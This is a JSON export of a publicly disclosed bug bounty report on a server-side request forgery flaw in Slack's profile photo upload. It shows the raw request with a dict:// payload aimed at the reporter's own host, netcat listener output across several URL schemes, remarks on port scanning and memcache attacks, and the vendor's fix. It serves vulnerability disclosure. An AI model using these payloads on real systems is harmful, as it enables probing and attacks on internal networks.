{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2014-11-21T10:03:46.939Z", 
    "voters": [
        "spam404", 
        "spetr0x"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "300.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 14127, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "SSRF on https://whitehataudit.slack.com/account/photo", 
    "is_member_of_team?": null, 
    "vote_count": 2, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2014-12-21T10:03:47.382Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$300", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2014-05-30T16:57:54.278Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-30T16:57:54.278Z", 
            "actor": {
                "username": "iamcal", 
                "url": "/iamcal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/138/8791978ab70ce1b1e1b7a9c70e393fcd58ea85a0_medium.jpg?1393562983"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Since we purposefully allow the fetching of any remote image over http(s), what do you suggest as a fix?", 
            "markdown_message": "<p>Since we purposefully allow the fetching of any remote image over http(s), what do you suggest as a fix?</p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 62140, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-05-30T21:03:29.701Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-30T21:03:29.701Z", 
            "actor": {
                "username": "4lemon", 
                "url": "/4lemon", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/194/f1d223980a49b86ae2763450dd2d6fa25ed0d799_medium.jpg?1468248798"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Fistable,\n- disable all wrappers except http and https, maybe ftp. Not like now - pop3, tenet, ldap, dict, gopher.\nSecondly, \n- allow only whitelisted port, not like now - any port. \n\nAt this time it is possible to scan port (for example internal network).  Wrappers dict and gopher can be used for attack plain text protocol like memcache. ", 
            "markdown_message": "<p>Fistable,</p>\n\n<ul>\n<li>disable all wrappers except http and https, maybe ftp. Not like now - pop3, tenet, ldap, dict, gopher.\nSecondly, </li>\n<li>allow only whitelisted port, not like now - any port. </li>\n</ul>\n\n<p>At this time it is possible to scan port (for example internal network).  Wrappers dict and gopher can be used for attack plain text protocol like memcache. </p>\n", 
            "type": "Activities::BugNew", 
            "id": 62415, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "4lemon", 
                "url": "/4lemon"
            }, 
            "created_at": "2014-05-31T00:45:02.334Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-31T00:45:02.334Z", 
            "actor": {
                "username": "iamcal", 
                "url": "/iamcal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/138/8791978ab70ce1b1e1b7a9c70e393fcd58ea85a0_medium.jpg?1393562983"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Ahh, I now understand what you're saying. I didn't realize we were allowing other protocols to be used.\n\nI've rolled out a fix to only allow HTTP/HTTPS for fetching here. I don't think we're going to limit ports. Does that fix the issue satisfactorily?", 
            "markdown_message": "<p>Ahh, I now understand what you&#39;re saying. I didn&#39;t realize we were allowing other protocols to be used.</p>\n\n<p>I&#39;ve rolled out a fix to only allow HTTP/HTTPS for fetching here. I don&#39;t think we&#39;re going to limit ports. Does that fix the issue satisfactorily?</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 62560, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-05-31T00:54:08.789Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-31T00:54:08.789Z", 
            "actor": {
                "username": "4lemon", 
                "url": "/4lemon", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/194/f1d223980a49b86ae2763450dd2d6fa25ed0d799_medium.jpg?1468248798"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "This much better than was. And i recommend to disallow requests to either local or public company's infrastructure IPs. This helps to avoid any possible attack vectors.", 
            "markdown_message": "<p>This much better than was. And i recommend to disallow requests to either local or public company&#39;s infrastructure IPs. This helps to avoid any possible attack vectors.</p>\n", 
            "type": "Activities::Comment", 
            "id": 62569, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2014-06-02T21:26:31.588Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-06-02T21:26:31.588Z", 
            "actor": {
                "url": "/slack", 
                "profile": {
                    "name": "Slack"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
                }
            }, 
            "team_handle": "slack", 
            "bounty_amount": "300.0", 
            "collaborator": {
                "username": "4lemon", 
                "url": "/4lemon"
            }, 
            "message": "Thanks - we'll likely implement something like this in the future. We have a change like this already planned for other components that perform fetches.", 
            "markdown_message": "<p>Thanks - we&#39;ll likely implement something like this in the future. We have a change like this already planned for other components that perform fetches.</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 63903, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-11-21T10:03:46.955Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-11-21T10:03:46.955Z", 
            "actor": {
                "username": "4lemon", 
                "url": "/4lemon", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/194/f1d223980a49b86ae2763450dd2d6fa25ed0d799_medium.jpg?1468248798"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 165697, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-12-21T10:03:57.746Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-12-21T10:03:57.746Z", 
            "actor": {
                "url": "/slack", 
                "profile": {
                    "name": "Slack"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
                }
            }, 
            "team_handle": "slack", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 185693, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "4lemon", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/4lemon", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/194/e692bb44d384f9a9ff923aa47266566581fb12b1_small.jpg?1468248798"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 58, 
        "name": "Command Injection - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -124981125.6352034, 
    "disclosed_at": "2014-12-21T10:03:57.732Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/14127", 
    "created_at": "2014-05-30T12:42:48.729Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>During post request to <a title=\"https://whitehataudit.slack.com/account/photo:\" href=\"/redirect?signature=e613c8a5d0abf6ba0f5491d9a54b0056595e1c0f&amp;url=https%3A%2F%2Fwhitehataudit.slack.com%2Faccount%2Fphoto%3A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://whitehataudit.slack.com/account/photo:</span><i class=\"icon-external-link\"></i></a><br>\nPOST /account/photo HTTP/1.1<br>\nHost: whitehataudit.slack.com<br>\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0<br>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3<br>\nAccept-Encoding: gzip, deflate<br>\nReferer: <a title=\"https://whitehataudit.slack.com/account/photo?url=http%3A%2F%2F95.211.198.76:5555%2Fpicture-54679.jpg\" href=\"/redirect?signature=91e53ebb819a41df69661c45b6ede6c0cd6f6209&amp;url=https%3A%2F%2Fwhitehataudit.slack.com%2Faccount%2Fphoto%3Furl%3Dhttp%253A%252F%252F95.211.198.76%3A5555%252Fpicture-54679.jpg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://whitehataudit.slack.com/account/photo?url=http%3A%2F%2F95.211.198.76:5555%2Fpicture-54679.jpg</span><i class=\"icon-external-link\"></i></a><br>\nCookie: _ga=GA1.2.1382862309.1401451625; a-2195611171=aP4kbQ9Y8dnl8ZYuS6SK6ZeF%2FyqCF%2Bt1hOMyzdBzvIbWXqrJ8IyG7%2B8S%2FG%2BOkuw9KDY2I%2BXGkTZ80XFYFYznxQ%3D%3D; a=2195611171<br>\nConnection: keep-alive<br>\nContent-Type: application/x-www-form-urlencoded<br>\nContent-Length: 123</p>\n\n<p>crumb=s-1401452311-423d40614d-%E2%98%83&amp;crop=1&amp;url=dict%3A%2F%2F95.211.198.76%3A6666%2Fpicture-54679.jpg&amp;cropbox=0%2C0%2C85</p>\n\n<p>We got an SSRF with NOT port whitelist and with NOT disabled wrappers (see below):<br>\nnc -lvv 6655<br>\nConnection from 184.73.10.28 port 6655 [tcp/<em>] accepted<br>\nGET /picture-54679.jpg HTTP/1.1<br>\nUser-Agent: Slackbot (+<a title=\"https://api.slack.com/robots\" href=\"/redirect?signature=2c884386ec7607ec20766cc0983d42358c8a517c&amp;url=https%3A%2F%2Fapi.slack.com%2Frobots\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://api.slack.com/robots</span><i class=\"icon-external-link\"></i></a>)<br>\nHost: 95.211.198.76:6655<br>\nAccept: */</em><br>\nAccept-Encoding: gzip,deflate</p>\n\n<p>gopher<br>\nnc -lvv 6655<br>\nConnection from 54.197.108.234 port 6655 [tcp/*] accepted<br>\nicture-54679.jpg</p>\n\n<p>dict.<br>\nnc -lvv 6655<br>\nConnection from 107.21.158.167 port 6655 [tcp/*] accepted<br>\nCLIENT libcurl 7.22.0<br>\npicture-54679.jpg<br>\nQUIT</p>\n\n<p>ldap<br>\nnc -lvv 6655<br>\nConnection from 54.224.81.147 port 6655 [tcp/*] accepted<br>\n0</p>\n\n<p>telnet<br>\nnc -lvv 6655<br>\nConnection from 54.224.81.147 port 6655 [tcp/*] accepted</p>\n\n<p>pop3<br>\nnc -lvv 6655<br>\nConnection from 50.16.108.10 port 6655 [tcp/*] accepted<br>\nQUIT</p>\n\n<p>It&#39;s possible to use it to port scanning (using timing). Good writeup about ssrf vulns: <a title=\"https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit\" href=\"/redirect?signature=ff04076721a02d7cd906b9be71179e5c5998c9c8&amp;url=https%3A%2F%2Fdocs.google.com%2Fdocument%2Fd%2F1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM%2Fedit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit</span><i class=\"icon-external-link\"></i></a></p>\n", 
    "vulnerability_information": "During post request to https://whitehataudit.slack.com/account/photo:\r\nPOST /account/photo HTTP/1.1\r\nHost: whitehataudit.slack.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://whitehataudit.slack.com/account/photo?url=http%3A%2F%2F95.211.198.76:5555%2Fpicture-54679.jpg\r\nCookie: _ga=GA1.2.1382862309.1401451625; a-2195611171=aP4kbQ9Y8dnl8ZYuS6SK6ZeF%2FyqCF%2Bt1hOMyzdBzvIbWXqrJ8IyG7%2B8S%2FG%2BOkuw9KDY2I%2BXGkTZ80XFYFYznxQ%3D%3D; a=2195611171\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 123\r\n\r\ncrumb=s-1401452311-423d40614d-%E2%98%83&crop=1&url=dict%3A%2F%2F95.211.198.76%3A6666%2Fpicture-54679.jpg&cropbox=0%2C0%2C85\r\n\r\nWe got an SSRF with NOT port whitelist and with NOT disabled wrappers (see below):\r\nnc -lvv 6655\r\nConnection from 184.73.10.28 port 6655 [tcp/*] accepted\r\nGET /picture-54679.jpg HTTP/1.1\r\nUser-Agent: Slackbot (+https://api.slack.com/robots)\r\nHost: 95.211.198.76:6655\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\n\r\ngopher\r\nnc -lvv 6655\r\nConnection from 54.197.108.234 port 6655 [tcp/*] accepted\r\nicture-54679.jpg\r\n\r\n\r\ndict.\r\nnc -lvv 6655\r\nConnection from 107.21.158.167 port 6655 [tcp/*] accepted\r\nCLIENT libcurl 7.22.0\r\npicture-54679.jpg\r\nQUIT\r\n\r\nldap\r\nnc -lvv 6655\r\nConnection from 54.224.81.147 port 6655 [tcp/*] accepted\r\n0\r\n\r\ntelnet\r\nnc -lvv 6655\r\nConnection from 54.224.81.147 port 6655 [tcp/*] accepted\r\n\r\npop3\r\nnc -lvv 6655\r\nConnection from 50.16.108.10 port 6655 [tcp/*] accepted\r\nQUIT\r\n\r\nIt's possible to use it to port scanning (using timing). Good writeup about ssrf vulns: https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit\r\n\r\n\r\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://slack.com", 
            "about": "All your team communication in one place, instantly searchable, and available wherever you go.", 
            "twitter_handle": "slackhq", 
            "name": "Slack"
        }, 
        "handle": "slack", 
        "url": "https://hackerone.com/slack", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/069/a44d7bfd843f514c723441a5a40daf5bac8e9e38_small.png?1449082084", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 69, 
        "default_currency": "usd"
    }, 
    "is_published": false
}